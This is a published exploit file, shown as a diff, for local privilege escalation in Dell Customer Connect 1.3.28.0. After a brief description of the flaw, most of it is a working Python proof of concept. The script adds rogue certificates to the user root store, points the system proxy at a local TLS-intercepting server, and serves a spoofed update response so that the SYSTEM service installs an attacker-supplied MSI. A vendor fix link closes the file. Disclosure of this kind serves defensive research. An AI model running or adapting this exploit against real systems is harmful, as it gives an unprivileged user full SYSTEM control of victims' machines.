@@ -1,0 +1,164 @@
+# Exploit Dell Customer Connect 1.3.28.0 Privilege Escalation
+# Date: 25.04.2017
+# Software Link: http://www.dell.com/
+# Exploit Author: Kacper Szurek
+# Contact: https://twitter.com/KacperSzurek
+# Website: https://security.szurek.pl/
+# Category: local
+  
+1. Description
+ 
+DCCService.exe is running on autostart as System.
+
+This service has auto update functionality.
+
+Basically it periodically checks https://otbs.azurewebsites.net looking for new config file.
+
+Under normal conditions we cannot spoof this connection because it’s SSL.
+
+But here WebUtils.sendWebRequest() is executed using Impersonator.RunImpersonated().
+
+RunImpersonated() executes given function in the context of currently logged in user.
+
+In Windows system we can add any certificate to Local user root store.
+
+Then this certificate is considered as trusted so we can perform MITM attack.
+
+It can be done using simple proxy server because by default .NET HttpWebRequest() uses IE proxy settings (which can by set by any user without administrator priveleges).
+
+https://security.szurek.pl/dell-customer-connect-13280-privilege-escalation.html
+
+2. Proof of Concept
+
+from _winreg import *
+from threading import Thread
+import os
+import subprocess
+import hashlib
+import SimpleHTTPServer
+import SocketServer
+import ssl
+import httplib
+import time
+
+msi_file = "exploit.msi"
+cert_file = "otbs.crt"
+signing_file = "code.cer"
+file_port = 5555
+proxy_port = 7777
+
+print "Dell Customer Connect 1.3.28.0 Privilege Escalation"
+print "by Kacper Szurek"
+print "https://security.szurek.pl/"
+print "https://twitter.com/KacperSzurek"
+
+# Simpe SSL proxy based on https://code.google.com/archive/p/proxpy/
+class ProxyHandler(SocketServer.StreamRequestHandler):
+	def __init__(self, request, client_address, server):
+		SocketServer.StreamRequestHandler.__init__(self, request, client_address, server)
+
+	def handle(self):
+		global xml
+		line = self.rfile.readline()
+		for l in self.rfile:
+			if l == "\r\n":
+				break
+			
+		if "GET /api/AppConfig" in line:
+			conn = httplib.HTTPSConnection(self.host, self.port)
+			print "\n[+] Send XML to service"
+			self.wfile.write("HTTP/1.1 200 200\r\n\r\n"+xml)
+		elif "CONNECT otbs.azurewebsites.net:443" in line:
+			socket_ssl = ssl.wrap_socket(self.request, server_side = True, certfile = cert_file, ssl_version = ssl.PROTOCOL_SSLv23, do_handshake_on_connect = False)
+			self.request.send("HTTP/1.1 200 Connection Established\r\n\r\n")
+			host, port = self.request.getpeername()
+			self.host = host
+			self.port = port
+			while True:
+				try:
+					socket_ssl.do_handshake()
+					break
+				except (ssl.SSLError, IOError):
+					return
+			print "\n[+] SSL Established with otbs.azurewebsites.net"
+			self.request = socket_ssl
+			self.setup()
+			self.handle()
+
+class ThreadedHTTPProxyServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
+	pass
+
+def add_to_store(name, file):
+	output = subprocess.Popen('certutil -user -addstore "Root" "{}"'.format(file), stdout=subprocess.PIPE).communicate()[0]
+	if "\"{}\" already in store".format(name) in output:
+		print "[+] Certificate {} already in store".format(name)
+	elif "\"{}\" added to store".format(name) in output:
+		print "[+] Add certificate {} to user root store".format(name)
+	else:
+		print "[-] You need to click OK in order to add cert to user root store"
+		os._exit(0)
+
+
+if not os.path.isfile(cert_file):
+	print "[-] Missing SSL file"
+	os._exit(0)
+
+if not os.path.isfile(signing_file):
+	print "[-] Missing code signing file"
+	os._exit(0)
+
+add_to_store("otbs.azurewebsites.net", cert_file)
+add_to_store("dell inc", signing_file)
+
+def sha256_checksum(filename, block_size=65536):
+    sha256 = hashlib.sha256()
+    with open(filename, 'rb') as f:
+        for block in iter(lambda: f.read(block_size), b''):
+            sha256.update(block)
+    return sha256.hexdigest()
+
+def file_server():
+	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+	httpd = SocketServer.TCPServer(("", file_port), Handler)
+	httpd.serve_forever()
+
+if not os.path.isfile(msi_file):
+	print "[-] Missing msi file"
+	os._exit(0)
+
+sha256 = sha256_checksum(msi_file)
+print "[+] MSI hash: {}".format(sha256)
+
+print "[+] Set Proxy Server in registry"
+key = OpenKey(HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Internet Settings', 0, KEY_ALL_ACCESS)
+SetValueEx(key, "ProxyServer", 0, REG_SZ, "127.0.0.1:{}".format(proxy_port))
+SetValueEx(key, "ProxyEnable", 0, REG_DWORD, 1)
+CloseKey(key)
+
+print "[+] Start file server on port {}".format(file_port)
+t1 = Thread(target = file_server)
+t1.daemon = True
+t1.start()
+
+xml = "<UpdateResponse xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><LatestVersion>9.0.0.6</LatestVersion><UpgradeUrl>http://localhost:{}/{}</UpgradeUrl><UpgradeHash>{}</UpgradeHash><SurveyCheckInterval>1</SurveyCheckInterval></UpdateResponse>".format(file_port, msi_file, sha256)
+
+print "[+] Start proxy server on port {}".format(proxy_port)
+proxy_server = ThreadedHTTPProxyServer(("127.0.0.1", proxy_port), ProxyHandler)
+t2 = Thread(target = proxy_server.serve_forever)
+t2.daemon = True
+t2.start()
+
+log_path = r"C:\Users\All Users\Dell\Dell Customer Connect\Logs\{}_install_log.txt".format(msi_file)
+
+print "[+] Waiting for execution ",
+
+while True:
+	if os.path.isfile(log_path):
+		print "\n[+] Looks like msi file was executed, exiting"
+		os._exit(0)
+	time.sleep(3)
+	print ".",
+
+3. Fix
+
+http://www.dell.com/support/home/us/en/19/Drivers/DriversDetails?driverId=DR53F
